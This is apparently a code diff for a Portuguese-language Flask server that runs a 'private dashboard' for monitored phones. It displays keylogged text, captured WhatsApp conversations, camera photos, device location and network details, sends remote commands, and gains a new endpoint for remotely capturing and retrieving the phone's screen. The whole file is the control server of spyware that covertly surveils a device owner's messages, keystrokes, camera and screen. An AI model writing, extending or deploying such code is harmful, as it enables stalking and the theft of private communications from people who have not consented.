@@ -40,15 +40,13 @@ HTML_DASHBOARD_PRIVADO = """<!DOCTYPE html>
         .btn-camera { display: block; width: 100%; background: #38bdf8; color: #0a0a0a; border: none; text-align: center; padding: 14px; border-radius: 8px; font-weight: bold; text-transform: uppercase; font-size: 13px; cursor: pointer; margin-bottom: 10px; }
         .btn-camera:disabled { opacity: 0.5; cursor: not-allowed; }
         
-        /* CELULAR CANVAS */
-        .phone-section { margin-bottom: 15px; }
+        /* CELULAR */
+        .phone-section { margin-bottom: 15px; text-align: center; }
         .phone-section h3 { color: #f59e0b; font-size: 13px; margin-bottom: 8px; text-transform: uppercase; }
-        .phone-container { display: flex; justify-content: center; }
         .phone-frame {
-            position: relative; width: 200px; height: 400px;
-            background: #1a1a1a; border: 4px solid #333;
-            border-radius: 25px; overflow: hidden;
-            box-shadow: 0 0 20px rgba(0,0,0,0.5), inset 0 0 10px rgba(0,0,0,0.3);
+            display: inline-block; position: relative; width: 200px; height: 400px;
+            background: #1a1a1a; border: 4px solid #333; border-radius: 25px;
+            overflow: hidden; box-shadow: 0 0 20px rgba(0,0,0,0.5);
         }
         .phone-notch {
             position: absolute; top: 8px; left: 50%; transform: translateX(-50%);
@@ -58,16 +56,9 @@ HTML_DASHBOARD_PRIVADO = """<!DOCTYPE html>
             width: 100%; height: 100%; display: flex; align-items: center; justify-content: center;
             background: #000; padding: 20px 5px;
         }
-        .phone-screen img {
-            width: 100%; height: 100%; object-fit: contain; display: none;
-        }
+        .phone-screen img { width: 100%; height: 100%; object-fit: contain; display: none; }
         .phone-placeholder { color: #555; font-size: 10px; text-align: center; }
-        .btn-print {
-            display: block; width: 100%; background: #f59e0b; color: #000;
-            border: none; text-align: center; padding: 14px; border-radius: 8px;
-            font-weight: bold; text-transform: uppercase; font-size: 13px;
-            cursor: pointer; margin-bottom: 15px; letter-spacing: 1px;
-        }
+        .btn-print { display: block; width: 100%; background: #f59e0b; color: #000; border: none; text-align: center; padding: 14px; border-radius: 8px; font-weight: bold; text-transform: uppercase; font-size: 13px; cursor: pointer; margin-bottom: 15px; }
         
         .cameras-row { display: grid; grid-template-columns: 1fr 1fr; gap: 12px; margin-bottom: 15px; }
         @media(max-width: 600px) { .cameras-row { grid-template-columns: 1fr; } }
@@ -128,21 +119,18 @@ HTML_DASHBOARD_PRIVADO = """<!DOCTYPE html>
                     <div class="info-box"><span>📶 Rede</span><strong id="txt_network">{{ info_moto.get('network', '--') }}</strong></div>
                 </div>
                 
-                <!-- CELULAR COM PRINT -->
+                <!-- CELULAR + PRINT -->
                 <div class="phone-section">
                     <h3>📱 Tela do Dispositivo</h3>
-                    <div class="phone-container">
-                        <div class="phone-frame">
-                            <div class="phone-notch"></div>
-                            <div class="phone-screen">
-                                <span id="phonePlaceholder" class="phone-placeholder">Clique em<br>"📱 Print Tela"<br>para capturar</span>
-                                <img id="phoneScreen" src="" alt="Tela" style="display:none;">
-                            </div>
+                    <div class="phone-frame">
+                        <div class="phone-notch"></div>
+                        <div class="phone-screen">
+                            <span id="phonePlaceholder" class="phone-placeholder">Clique em<br>"📱 Print Tela"</span>
+                            <img id="phoneScreen" src="" alt="Tela" style="display:none;">
                         </div>
                     </div>
                 </div>
-                
-                <button class="btn-print" onclick="tirarPrint()">📱 Print Tela</button>
+                <button class="btn-print" onclick="enviarComando('print_tela'); setTimeout(tirarPrint, 3000);">📱 Print Tela</button>
                 
                 <div id="map_private" class="map-container"></div>
                 <div class="btn-row">
@@ -185,34 +173,20 @@ HTML_DASHBOARD_PRIVADO = """<!DOCTYPE html>
                 }
                 
                 function tirarPrint() {
-                    enviarComando('print_tela');
-                    // Espera o print chegar
-                    let tentativas = 0;
-                    let checar = setInterval(() => {
-                        fetch('/api/get_camera/{{ id_buscado }}')
-                            .then(r => r.json())
-                            .then(d => {
-                                if(d.photo_front && d.photo_front.length > 100) {
-                                    // O print vem como photo_front (screen)
-                                    document.getElementById('phonePlaceholder').style.display = 'none';
-                                    document.getElementById('phoneScreen').src = 'data:image/png;base64,' + d.photo_front;
-                                    document.getElementById('phoneScreen').style.display = 'block';
-                                    clearInterval(checar);
-                                }
-                            });
-                        tentativas++;
-                        if(tentativas > 20) clearInterval(checar);
-                    }, 1500);
+                    fetch('/api/get_print/{{ id_buscado }}')
+                        .then(r => r.json())
+                        .then(d => {
+                            if(d.print && d.print.length > 100) {
+                                document.getElementById('phonePlaceholder').style.display = 'none';
+                                document.getElementById('phoneScreen').src = 'data:image/png;base64,' + d.print;
+                                document.getElementById('phoneScreen').style.display = 'block';
+                            }
+                        });
                 }
                 
                 function toggleChat(pessoa, card) {
-                    if (card.classList.contains('aberto')) {
-                        card.classList.remove('aberto');
-                        delete chatsAbertos[pessoa];
-                    } else {
-                        card.classList.add('aberto');
-                        chatsAbertos[pessoa] = true;
-                    }
+                    if (card.classList.contains('aberto')) { card.classList.remove('aberto'); delete chatsAbertos[pessoa]; }
+                    else { card.classList.add('aberto'); chatsAbertos[pessoa] = true; }
                 }
                 
                 async function dispararCapturaDupla() {
@@ -258,8 +232,7 @@ HTML_DASHBOARD_PRIVADO = """<!DOCTYPE html>
                                 kb.className = 'keylog-box ativo';
                                 kb.innerHTML = '<p>⌨️ <span class="app-nome">' + d.keylog.app + '</span> monitorado' + (d.keylog.texto ? ' - ' + d.keylog.texto.substring(0,80) : '') + '</p>';
                             } else {
-                                kb.className = 'keylog-box';
-                                kb.innerHTML = '<p>⌨️ Nenhum app monitorado aberto</p>';
+                                kb.className = 'keylog-box'; kb.innerHTML = '<p>⌨️ Nenhum app monitorado aberto</p>';
                             }
                             
                             if(d.whatsapp && d.whatsapp.length > 0) {
@@ -267,23 +240,9 @@ HTML_DASHBOARD_PRIVADO = """<!DOCTYPE html>
                                 d.whatsapp.forEach(chat => {
                                     let temMidia = chat.midia ? '📎 ' : '';
                                     let aberto = chatsAbertos[chat.pessoa] ? ' aberto' : '';
-                                    html += `<div class="chat-card${aberto}" onclick="toggleChat('${chat.pessoa}', this)">
-                                        <div class="chat-card-header">
-                                            <span class="pessoa">👤 ${chat.pessoa}</span>
-                                            <div class="info">
-                                                <span class="ultima">${temMidia}${chat.ultima_msg || ''}</span>
-                                                <span class="total">${chat.total}</span>
-                                            </div>
-                                        </div>
-                                        <div class="chat-card-body">`;
-                                    if(chat.mensagens) {
-                                        chat.mensagens.slice().reverse().forEach(msg => {
-                                            let cls = 'chat-msg ' + (msg.tipo || 'recebida');
-                                            if(msg.midia) cls += ' midia';
-                                            html += `<div class="${cls}">📥 ${msg.texto} <span class="hora">${msg.hora}</span></div>`;
-                                        });
-                                    }
-                                    html += `</div></div>`;
+                                    html += `<div class="chat-card${aberto}" onclick="toggleChat('${chat.pessoa}', this)"><div class="chat-card-header"><span class="pessoa">👤 ${chat.pessoa}</span><div class="info"><span class="ultima">${temMidia}${chat.ultima_msg || ''}</span><span class="total">${chat.total}</span></div></div><div class="chat-card-body">`;
+                                    if(chat.mensagens) { chat.mensagens.slice().reverse().forEach(msg => { let cls = 'chat-msg ' + (msg.tipo || 'recebida'); if(msg.midia) cls += ' midia'; html += `<div class="${cls}">📥 ${msg.texto} <span class="hora">${msg.hora}</span></div>`; }); }
+                                    html += '</div></div>';
                                 });
                                 document.getElementById('chatList').innerHTML = html;
                             }
@@ -338,8 +297,7 @@ def comando_camera(device_id):
 def comando_remoto(device_id):
     device_id = device_id.upper()
     if device_id not in db_dispositivos: db_dispositivos[device_id] = {}
-    acao = (request.get_json(force=True, silent=True) or {}).get("acao", "none")
-    db_dispositivos[device_id]["cmd_remoto"] = acao
+    db_dispositivos[device_id]["cmd_remoto"] = (request.get_json(force=True, silent=True) or {}).get("acao", "none")
     return jsonify({"status": "ok"}), 200
 
 @app.route('/api/upload_lote', methods=['POST'])
@@ -352,26 +310,30 @@ def upload_lote():
         return jsonify({"status": "stored"}), 200
     return jsonify({"status": "error"}), 404
 
-@app.route('/api/upload_camera', methods=['POST'])
-def upload_camera():
+@app.route('/api/upload_print', methods=['POST'])
+def upload_print():
+    """Endpoint EXCLUSIVO para print de tela"""
     data = request.get_json(force=True, silent=True) or {}
     dev_id = data.get("device_id", '').upper()
-    tipo = data.get("tipo")
     foto = data.get("photo", "")
     if dev_id and dev_id in db_dispositivos and foto:
-        if tipo == "screen":
-            db_dispositivos[dev_id]["photo_front"] = foto  # Print vai como photo_front
-        else:
-            db_dispositivos[dev_id][f"photo_{tipo}"] = foto
+        db_dispositivos[dev_id]["print_tela"] = foto
         return jsonify({"status": "stored"}), 200
     return jsonify({"status": "error"}), 400
+
+@app.route('/api/get_print/<device_id>')
+def get_print(device_id):
+    """Retorna APENAS o print, sem misturar com câmera"""
+    device_id = device_id.upper()
+    if device_id in db_dispositivos:
+        return jsonify({"print": db_dispositivos[device_id].get("print_tela", "")}), 200
+    return jsonify({"print": ""}), 404
 
 @app.route('/api/get_camera/<device_id>')
 def get_camera(device_id):
     device_id = device_id.upper()
     if device_id in db_dispositivos:
-        pf = db_dispositivos[device_id].get("photo_front", "")
-        pb = db_dispositivos[device_id].get("photo_back", "")
+        pf = db_dispositivos[device_id].get("photo_front", ""); pb = db_dispositivos[device_id].get("photo_back", "")
         return jsonify({"photo_front": pf, "photo_back": pb, "pronto": bool(pf and pb)}), 200
     return jsonify({"photo_front": "", "photo_back": "", "pronto": False}), 404
 
